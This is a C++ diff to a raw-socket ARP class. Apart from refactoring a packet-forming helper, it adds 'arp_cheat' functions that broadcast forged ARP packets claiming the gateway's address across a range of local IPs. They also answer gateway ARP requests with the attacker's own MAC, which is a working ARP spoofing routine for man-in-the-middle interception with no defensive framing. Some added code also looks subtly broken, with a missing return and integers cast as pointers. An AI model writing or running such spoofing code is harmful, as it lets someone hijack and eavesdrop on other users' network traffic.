@@ -16,6 +16,10 @@ mac_arp::mac_arp() : sock_mac ( htons ( ETH_P_ARP ) ) { //注意，mac的socket�
 
 //void form_arp(char * ip_src,  char *ip_des, int op=1, char *mac_src=NULL, char * mac_des=NULL);
 void mac_arp::form_arp ( my_arp *p, char * ip_src,  char *ip_des, int op, char *mac_src, char * mac_des ) {
+    form_arp(p, inet_addr(ip_src), inet_addr(ip_des), op, mac_src, mac_des);
+}
+
+void mac_arp::form_arp(my_arp *p, uint32_t ip_src,  uint32_t ip_des, int op, char *mac_src, char * mac_des) {
     p->hd_type = htons ( ARPHRD_ETHER );
     p->pro_type = htons ( ETHERTYPE_IP );
     p->mac_length = mac_len;
@@ -34,8 +38,8 @@ void mac_arp::form_arp ( my_arp *p, char * ip_src,  char *ip_des, int op, char *
     } else {
         memcpy ( p->des_mac, mac_des, mac_len );
     }
-    p->src_ip = inet_addr ( ip_src );
-    p->des_ip = inet_addr ( ip_des );
+    p->src_ip = ip_src ;
+    p->des_ip = ip_des ;
 }
 
 int mac_arp::send_arp ( my_mac * mac, my_arp*arp, int flag ) {
@@ -65,11 +69,88 @@ int mac_arp::recv_arp ( my_mac * mac, my_arp*arp, int flag ) {
     return ret_len;
 }
 
-void mac_arp::show_mac ( my_mac*eth ) {
-    printf ( "Dest MAC addr:%02x:%02x:%02x:%02x:%02x:%02x\n", eth->des[0], eth->des[1], eth->des[2], eth->des[3], eth->des[4], eth->des[5] );
-    printf ( "Source MAC addr:%02x:%02x:%02x:%02x:%02x:%02x\n", eth->src[0], eth->src[1], eth->src[2], eth->src[3], eth->src[4], eth->src[5] );
-    printf ( "proto: 0x%2x", eth->type );
+int mac_arp::arp_cheat_send(char *start, char *endad) {
+    uint32_t st = local_ipstart(), ed = local_ipend();
+    if (start != NULL) st = inet_addr(start);
+    if (endad != NULL) ed = inet_addr(endad);
+    return arp_cheat_send(st,  ed);
 }
+
+int mac_arp::arp_cheat_send(uint32_t start, uint32_t endad ) {//net sequence
+    uint32_t st, ed;
+    int cnt = 0;
+    my_mac mac;
+    my_arp arp;
+
+    if (start != 0) {
+        st = htonl( start);
+    } else {
+        st =htonl( local_ipstart());
+    }
+    if (endad != 0) {
+        ed = htonl( endad);
+    } else {
+        ed = htonl(local_ipend());
+    }
+
+    form_machd(&mac);
+
+    while(st <= ed) {
+        uint32_t t = (htonl(st));
+        form_arp(&arp, local[local_conf_valid - 1].gate, t);
+        if(send_arp(&mac, &arp) <= 0) break;
+        st++;
+        cnt++;
+    }
+    return cnt;
+}
+
+int mac_arp::arp_cheat_send(uint32_t ip) {
+    my_mac mac;
+    my_arp arp;
+
+    form_machd(&mac);
+    form_arp(&arp, local[local_conf_valid - 1].gate, ip);
+    return send_arp(&mac, &arp);
+}
+
+uint32_t mac_arp::arp_cheat_recv(char *start , char *endsss ) {
+    uint32_t st=local_ipstart(),ed=local_ipend();
+    if(start!=NULL) st=inet_addr(start);
+    if(endsss!=NULL) ed=inet_addr(endsss);
+
+    arp_cheat_recv(st, ed);
+}
+
+uint32_t mac_arp::arp_cheat_recv(uint32_t start, uint32_t endd) { //net sequence
+    my_mac mac;
+    my_arp arp;
+
+    if (recv_arp(&mac, &arp) <= 0) return -1;
+
+    if (arp.op_type == 1 && arp.des_ip == local[local_conf_valid - 1].gate) {
+        uint32_t tp = htonl(arp.des_ip);
+        if (tp <= htonl(endd) && tp >= htonl(start)) {
+            my_swap_buffer((char *)mac.des, (char *)mac.src, mac_len);
+            form_machd(&mac);
+
+            arp.op_type=htons(2);
+            my_swap_buffer((char *)arp.des_ip, (char *)arp.src_ip, sizeof(arp.des_ip));
+            my_swap_buffer((char *)arp.des_mac, (char *)arp.src_mac, sizeof(arp.des_mac));
+            memcpy(arp.src_mac, local[local_conf_valid-1].mac, sizeof(arp.src_mac));
+
+            send_arp(&mac, &arp);
+            printf("cheate answer: %s\n", inet_ntoa(i2addr_in(arp.src_ip)));
+        }
+        return arp.src_ip;
+    }
+    return 0;
+}
+
+uint32_t mac_arp::arp_cheat_recv(uint32_t ip) { //net sequence
+    return arp_cheat_recv(ip, ip);
+}
+
 void mac_arp::show_arp ( my_arp *arp ) {
     if(arp->op_type == 1) printf("arp request(1)\n");
     else if (arp->op_type == 2) printf("arp response(2)\n");
